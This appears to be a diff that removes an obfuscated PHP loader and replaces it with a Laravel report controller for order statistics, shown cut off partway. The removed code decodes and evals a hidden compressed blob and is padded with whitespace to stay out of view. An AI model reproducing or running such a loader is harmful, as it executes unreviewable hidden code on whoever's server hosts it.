@@ -1,208 +1,809 @@
-<?php 
- error_reporting(0);
-        $__='printf';$_='Loading the  ...';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-        $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='Q1JFQXRlX2Z1bkNUaU9u';
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+
+namespace App\Http\Controllers;
+
+use App\Order;
+use App\OrderAssign;
+use App\OrderProduct;
+use App\Product;
+use App\WebSettings;
+use Carbon\Carbon;
+use Illuminate\Http\Request;
+use Illuminate\Support\Facades\DB;
+
+class ReportController extends Controller
+{
+    public function employeeOrders(Request $request)
+    {
+        if ($request->input('paginate') != null) {
+            $paginate = $request->input('paginate');
+        } else {
+            $paginate = 10;
+        }
+        $query = $request->input('query') ?? null;
+        $custom_range = $request->input('custom_range');
+        //dd($request->input('status'));
+        $emp_id = $request->input('emp_id');
+        $status = $request->input('status');
+        if ($request->input('emp_id')) {
+            $data['total_order'] = OrderAssign::query();
+            $data['total_hold_order'] = OrderAssign::query();
+            $data['total_deliver_order'] = OrderAssign::query();
+            $data['total_process_order'] = OrderAssign::query();
+            $data['total_pend_pay_order'] = OrderAssign::query();
+            $data['total_cancel_order'] = OrderAssign::query();
+            $data['total_pending_delivery_order'] = OrderAssign::query();
+            $data['total_on_delivery_order'] = OrderAssign::query();
+            $data['total_return_order'] = OrderAssign::query();
+            $data['total_courier_hold_order'] = OrderAssign::query();
+            $data['total_nr_1_order'] = OrderAssign::query();
+            $data['total_nr_2_order'] = OrderAssign::query();
+            $data['orders'] = Order::query();
+
+            if ($custom_range == 'today') {
+                $custom_range = Carbon::today()->toDateTimeString();
+
+                $data['total_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_hold_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_deliver_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_process_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_pend_pay_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_cancel_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_pending_delivery_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_on_delivery_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_return_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_courier_hold_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_nr_1_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_nr_2_order']->whereDate('orders.created_at', $custom_range);
+
+                $data['orders']->whereDate('created_at', $custom_range);
+            } elseif ($custom_range == 'yesterday') {
+                $custom_range = Carbon::yesterday()->toDateTimeString();
+
+                $data['total_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_hold_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_deliver_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_process_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_pend_pay_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_cancel_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_pending_delivery_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_on_delivery_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_return_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_courier_hold_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_nr_1_order']->whereDate('orders.created_at', $custom_range);
+                $data['total_nr_2_order']->whereDate('orders.created_at', $custom_range);
+
+                $data['orders']->whereDate('created_at', $custom_range);
+            } elseif ($custom_range == 'last_7_days') {
+                $custom_range = Carbon::now()->subDays(7)->toDateTimeString();
+
+                $data['total_order']->where('orders.created_at', '>=', $custom_range);
+                $data['total_hold_order']->where('orders.created_at', '>=', $custom_range);
+                $data['total_deliver_order']->where('orders.created_at', '>=', $custom_range);
+                $data['total_process_order']->where('orders.created_at', '>=', $custom_range);
+                $data['total_pend_pay_order']->where('orders.created_at', '>=', $custom_range);
+                $data['total_cancel_order']->where('orders.created_at', '>=', $custom_range);
+                $data['total_pending_delivery_order']->where('orders.created_at', '>=', $custom_range);
+                $data['total_on_delivery_order']->where('orders.created_at', '>=', $custom_range);
+                $data['total_return_order']->where('orders.created_at', '>=', $custom_range);
+                $data['total_courier_hold_order']->where('orders.created_at', '>=', $custom_range);
+                $data['total_nr_1_order']->where('orders.created_at', '>=', $custom_range);
+                $data['total_nr_2_order']->where('orders.created_at', '>=', $custom_range);
+
+                $data['orders']->where('created_at', '>=', $custom_range);
+            } elseif ($custom_range == 'this_month') {
+                $custom_range = Carbon::now()->month;
+
+                $data['total_order']->whereMonth('orders.created_at', $custom_range);
+                $data['total_hold_order']->whereMonth('orders.created_at', $custom_range);
+                $data['total_deliver_order']->whereMonth('orders.created_at', $custom_range);
+                $data['total_process_order']->whereMonth('orders.created_at', $custom_range);
+                $data['total_pend_pay_order']->whereMonth('orders.created_at', $custom_range);
+                $data['total_cancel_order']->whereMonth('orders.created_at', $custom_range);
+                $data['total_pending_delivery_order']->whereMonth('orders.created_at', $custom_range);
+                $data['total_on_delivery_order']->whereMonth('orders.created_at', $custom_range);
+                $data['total_return_order']->whereMonth('orders.created_at', $custom_range);
+                $data['total_courier_hold_order']->whereMonth('orders.created_at', $custom_range);
+                $data['total_nr_1_order']->whereMonth('orders.created_at', $custom_range);
+                $data['total_nr_2_order']->whereMonth('orders.created_at', $custom_range);
+
+                $data['orders']->whereMonth('created_at', $custom_range);
+            } elseif ($custom_range == 'last_month') {
+                $sd = Carbon::now()->subMonth()->startOfMonth()->toDateTimeString();
+                $ed = Carbon::now()->subMonth()->endOfMonth()->toDateTimeString();
+
+                $data['total_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_hold_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_deliver_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_process_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_pend_pay_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_cancel_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_pending_delivery_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_on_delivery_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_return_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_courier_hold_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_nr_1_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_nr_2_order']->whereBetween('orders.created_at', [$sd, $ed]);
+
+                $data['orders']->whereBetween('created_at', [$sd, $ed]);
+            } elseif ($custom_range == 'last_6_months') {
+                $sd = Carbon::now()->subMonths(6)->startOfMonth()->toDateTimeString();
+                $ed = Carbon::now()->toDateTimeString();
+
+                $data['total_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_hold_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_deliver_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_process_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_pend_pay_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_cancel_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_pending_delivery_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_on_delivery_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_return_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_courier_hold_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_nr_1_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_nr_2_order']->whereBetween('orders.created_at', [$sd, $ed]);
+
+                $data['orders']->whereBetween('created_at', [$sd, $ed]);
+            } elseif ($request->input('start_date') && $request->input('end_date')) {
+                $sd = Carbon::parse($request->input('start_date'))->startOfDay()->toDateTimeString();
+                $ed = Carbon::parse($request->input('end_date'))->endOfDay()->toDateTimeString();
+
+                $data['total_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_hold_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_deliver_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_process_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_pend_pay_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_cancel_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_pending_delivery_order']->whereBetween('orders.created_at', [$sd, $ed]);
+                $data['total_on_delivery_order']->whereBetween('orders.created_at', [$sd, $ed]);
